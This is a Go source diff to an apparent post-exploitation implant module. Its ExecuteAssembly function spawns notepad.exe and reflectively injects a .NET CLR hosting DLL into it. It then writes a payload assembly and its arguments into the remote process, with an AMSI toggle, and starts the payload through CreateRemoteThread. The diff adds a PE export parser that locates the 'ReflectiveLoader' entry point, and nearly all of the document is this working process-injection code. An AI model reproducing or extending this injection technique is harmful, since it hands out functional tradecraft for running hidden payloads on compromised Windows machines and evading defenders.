@@ -4,6 +4,8 @@ package assembly
 
 import (
 	"bytes"
+	"encoding/binary"
+	"errors"
 	"fmt"
 	"log"
 	"os"
@@ -16,11 +18,12 @@ import (
 )
 
 const (
-	BobLoaderOffset     = 0x00000e00 //  0x00000af0
+
 	PROCESS_ALL_ACCESS  = syscall.STANDARD_RIGHTS_REQUIRED | syscall.SYNCHRONIZE | 0xfff
 	MEM_COMMIT          = 0x001000
 	MEM_RESERVE         = 0x002000
-	MAX_ASSEMBLY_LENGTH = 1025024
+	STILL_RUNNING		= 259
+	EXPORTED_FUNCTION_NAME = "ReflectiveLoader"
 )
 
 var (
@@ -90,9 +93,11 @@ func getExitCodeThread(threadHandle syscall.Handle) (uint32, error) {
 
 // ExecuteAssembly loads a .NET CLR hosting DLL inside a notepad.exe process
 // along with a provided .NET assembly to execute.
-func ExecuteAssembly(hostingDll, assembly []byte, params string, amsi bool) error {
+func ExecuteAssembly(hostingDll []byte, assembly []byte, params string, amsi bool) error {
 	AssemblySizeArr := convertIntToByteArr(len(assembly))
-	ParamsSizeArr := convertIntToByteArr(len(params))
+
+	ParamsSizeArr := convertIntToByteArr(len(params)+1)// +1 accounts for the trailing null
+
 
 	cmd := exec.Command("notepad.exe")
 	cmd.SysProcAttr = &syscall.SysProcAttr{
@@ -121,10 +126,9 @@ func ExecuteAssembly(hostingDll, assembly []byte, params string, amsi bool) erro
 		return err
 	}
 	log.Printf("[*] Hosting DLL reflectively injected at 0x%08x\n", hostingDllAddr)
-	// Total size to allocate = assembly size + 1024 bytes for the args
-	totalSize := uint32(MAX_ASSEMBLY_LENGTH)
+
 	// VirtualAllocEx to allocate another memory segment for hosting the .NET assembly and args
-	assemblyAddr, err := virtualAllocEx(handle, 0, totalSize, MEM_COMMIT|MEM_RESERVE, syscall.PAGE_READWRITE)
+	assemblyAddr, err := virtualAllocEx(handle, 0, uint32(len(assembly)), MEM_COMMIT|MEM_RESERVE, syscall.PAGE_READWRITE)
 	if err != nil {
 		return err
 	}
@@ -140,7 +144,10 @@ func ExecuteAssembly(hostingDll, assembly []byte, params string, amsi bool) erro
 	} else {
 		payload = append(payload, byte(0))
 	}
-	payload = append(payload, []byte(params)...)
+
+	payload = append(payload,  []byte(params)...)
+	payload = append(payload,  '\x00')
+
 	payload = append(payload, assembly...)
 
 	// WriteProcessMemory to write the .NET assembly + args
@@ -151,7 +158,10 @@ func ExecuteAssembly(hostingDll, assembly []byte, params string, amsi bool) erro
 	log.Printf("[*] Wrote %d bytes at 0x%08x\n", len(payload), assemblyAddr)
 	// CreateRemoteThread(DLL addr + offset, assembly addr)
 	attr := new(syscall.SecurityAttributes)
-	threadHandle, _, err := createRemoteThread(handle, attr, 0, uintptr(hostingDllAddr+BobLoaderOffset), uintptr(assemblyAddr), 0)
+
+	functionOffset, err := findRawFileOffset(hostingDll, EXPORTED_FUNCTION_NAME)
+
+	threadHandle, _, err := createRemoteThread(handle, attr, 0, uintptr(hostingDllAddr + uintptr(functionOffset)), uintptr(assemblyAddr), 0)
 	if err != nil {
 		return err
 	}
@@ -161,7 +171,7 @@ func ExecuteAssembly(hostingDll, assembly []byte, params string, amsi bool) erro
 		if err != nil && !strings.Contains(err.Error(), "operation completed successfully") {
 			log.Fatalln(err.Error())
 		}
-		if code == 259 {
+		if code == STILL_RUNNING {
 			time.Sleep(1000 * time.Millisecond)
 		} else {
 			break
@@ -184,4 +194,212 @@ func convertIntToByteArr(num int) (arr []byte) {
 	arr = append(arr, byte(v))
 
 	return
+}
+
+
+func findRawFileOffset(pSourceBytes []byte, exportedFunctionName string) (rawOffset DWORD, err error){
+
+	var pImageHeader IMAGE_DOS_HEADER
+	var pOldNtHeader IMAGE_NT_HEADERS
+	var pOldOptHeader IMAGE_OPTIONAL_HEADER
+	var pOldFileHeader IMAGE_FILE_HEADER
+
+	// we will re read portions of the byte array into data structs
+	// Set back to start
+	rdrBytes := bytes.NewReader(pSourceBytes)
+	err = binary.Read(rdrBytes, binary.LittleEndian, &pImageHeader)
+	if err != nil {
+		log.Printf("Failure Reading dll in binary mode, for pImageHeader : %s\n", err)
+	}
+
+	// Check the Magic Byte
+	if pImageHeader.E_magic != 0x5A4D {
+		err = errors.New("Invalid File Format")
+		return
+	}
+
+	// Just Read the NTHeader from the DLL and cast it pOldNtHeader
+	ntHeaderOffset := pImageHeader.E_lfanew
+	const sizeOfNTHeader = unsafe.Sizeof(pOldNtHeader)
+
+	// Set the position at the ntHeaderOffset
+	rdrBytes = bytes.NewReader(pSourceBytes[ntHeaderOffset:])
+	err = binary.Read(rdrBytes, binary.LittleEndian, &pOldNtHeader)
+	if err != nil {
+		log.Printf("Failure Reading dll in binary mode, for pOldNtHeader : %s\n", err)
+		return
+	}
+
+	// populate the Optional Header
+	pOldOptHeader = pOldNtHeader.OptionalHeader
+	pOldFileHeader = pOldNtHeader.FileHeader
+
+	// Where is the export table?
+	var exportTableAddress DWORD
+	exportTableAddress = pOldOptHeader.DataDirectory[0].VirtualAddress
+
+	var sectionHeaderOffset uint16
+	sectionHeaderOffset = IMAGE_FIRST_SECTION(pImageHeader.E_lfanew, pOldNtHeader)
+	var sectionHeader IMAGE_SECTION_HEADER
+	const sectionHeaderSize = unsafe.Sizeof(sectionHeader)
+	var i WORD
+
+	// look for the exports
+	section := 0
+	var sectionName  [8]BYTE
+	var pointerToCodeRawData DWORD
+	var virtualOffsetForCode DWORD
+	for i = 0; i != pOldFileHeader.NumberOfSections; i++ {
+		rdrBytes = bytes.NewReader(pSourceBytes[sectionHeaderOffset:])
+		err = binary.Read(rdrBytes, binary.LittleEndian, &sectionHeader)
+		if err != nil {
+			log.Printf("Failure Reading dll in binary mode, for sectionHeader : %s", err.Error())
+			return
+		}
+
+		// We need to find the .text section to capture the code offset and virtual address
+		var secName []byte
+		for _, b := range sectionHeader.Name{
+			if b == 0 {
+				break
+			}
+			secName = append(secName, byte(b))
+		}
+		if bytes.Contains(secName, []byte(".text")){
+			virtualOffsetForCode =sectionHeader.VirtualAddress
+			virtualOffsetForCode =sectionHeader.VirtualAddress
+			pointerToCodeRawData=sectionHeader.PointerToRawData
+			// This is for finding the DLLMain
+		}
+
+		// For Export table
+		if sectionHeader.VirtualAddress > exportTableAddress {
+			break
+		}
+		sectionName =  sectionHeader.Name
+		section++
+		sectionHeaderOffset = sectionHeaderOffset + uint16(sectionHeaderSize)
+	}
+
+	sectionHeaderOffset = IMAGE_FIRST_SECTION(pImageHeader.E_lfanew, pOldNtHeader)
+	// process each section
+	for i = 0; i != pOldFileHeader.NumberOfSections; i++ {
+		// Read in the bytes to make up the sectionHeader
+		// Set the position at the ntHeaderOffset
+
+		rdrBytes = bytes.NewReader(pSourceBytes[sectionHeaderOffset:])
+		err = binary.Read(rdrBytes, binary.LittleEndian, &sectionHeader)
+		if err != nil {
+			log.Printf("Failure Reading dll in binary mode, for sectionHeader : %s\n", err)
+			return
+		}
+
+		if sectionHeader.SizeOfRawData > 0 {
+			source := make([]byte, sectionHeader.SizeOfRawData)
+			// Set the position at the ntHeaderOffset
+
+			rdrBytes = bytes.NewReader(pSourceBytes[sectionHeader.PointerToRawData:])
+			err = binary.Read(rdrBytes, binary.LittleEndian, &source)
+			if err != nil {
+				log.Printf("Failure Reading dll in binary mode, for source : %s\n", err)
+				return
+			}
+
+			if sectionHeader.Name == sectionName  {
+
+				// Let's get the Data Dictionary for the Export table
+				addrOffset := exportTableAddress - sectionHeader.VirtualAddress
+				var exportDirectory IMAGE_EXPORT_DIRECTORY
+				length := unsafe.Sizeof(exportDirectory)
+
+				offset := sectionHeader.PointerToRawData + DWORD(addrOffset)
+				rdrBytes = bytes.NewReader(pSourceBytes[offset:offset+DWORD(length)])
+				err = binary.Read(rdrBytes, binary.LittleEndian, &exportDirectory)
+				if err != nil {
+					log.Printf("Failure Reading dll in binary mode, for fragment : %s\n", err)
+					return
+				}
+
+				//Let's process the names in order to identify the exported function that we are looking for
+				addr := sectionHeader.PointerToRawData + exportDirectory.AddressOfNames - sectionHeader.VirtualAddress
+				addrBytes, e :=getAddress(pSourceBytes, DWORD(addr), 4)
+				if e != nil {
+					err = e
+					log.Printf("Failure Reading dll in binary mode, for AddressOfNames : %s\n", err)
+					return
+				}
+				expOffset := 0
+				for i := len(addrBytes)-1; i >= 0; i-- {
+					expOffset *= 256
+					expOffset += int(addrBytes[i])
+				}
+
+				// Now let's read the value at the the identified address
+				//  To do so we need to find the raw offset in the source bytes
+				addr = sectionHeader.PointerToRawData + DWORD( expOffset) - sectionHeader.VirtualAddress
+				nameLength := len(exportedFunctionName) + 1
+
+				addrBytes, err =getAddress(pSourceBytes,addr, uint32(nameLength))
+				if err != nil {
+					log.Printf("Failure Reading dll in binary mode, for AddressOfNames : %s\n", err.Error())
+					return
+				}
+				var name []byte
+				for _, b := range addrBytes{
+					if b == 0 {
+						break
+					}
+					name = append(name, b)
+				}
+
+				if( bytes.Contains(name, []byte("?"+exportedFunctionName))){
+					//fmt.Println(" **** FOUND ****")
+
+					// let's get the address for this function
+					addr = sectionHeader.PointerToRawData + exportDirectory.AddressOfFunctions -sectionHeader.VirtualAddress
+					addrBytes, err =getAddress(pSourceBytes, addr, 4)
+					if err != nil {
+						log.Printf("Failure Reading dll in binary mode, for AddressOfFunctions : %s\n", err.Error())
+						return
+					}
+					//fmt.Printf("\nexportDirectory.AddressOfFunctions @ %x %x %x\n", exportDirectory.AddressOfFunctions, addrBytes, addrBytes)
+					expOffset = 0
+					for i := len(addrBytes)-1; i >= 0; i-- {
+						expOffset *= 256
+						expOffset += int(addrBytes[i])
+					}
+					// Because we are looking for the position in the file we need to convert the address from in memory
+					//  to where it is in the raw file
+					rawOffset = pointerToCodeRawData + DWORD(expOffset) - virtualOffsetForCode
+					return
+				}
+			}
+		}
+		// Increment the section header the size of the the section header
+		sectionHeaderOffset = sectionHeaderOffset + uint16(sectionHeaderSize)
+
+	}
+	return 0, errors.New("Export not found")
+}
+
+func getAddress(source []byte, offset  DWORD, length uint32)(result []byte, err error){
+
+	result = make([]byte, length)
+	rdrBytes := bytes.NewReader(source[offset:offset+DWORD(length)])
+	err = binary.Read(rdrBytes, binary.LittleEndian, &result)
+	return
+}
+
+
+func IMAGE_FIRST_SECTION(offset LONG, ntHeader IMAGE_NT_HEADERS) uint16 {
+
+	//We need to find the starting address of the Section Images
+	var x IMAGE_NT_HEADERS
+	const sizeSignature = unsafe.Sizeof(x.Signature)
+	const sizeFileHeader = unsafe.Sizeof(x.FileHeader)
+	const sizeOptHeader = unsafe.Sizeof(x.OptionalHeader)
+
+	total := uint16(uintptr(offset) + sizeSignature + sizeFileHeader + sizeOptHeader)
+
+	return total
 }
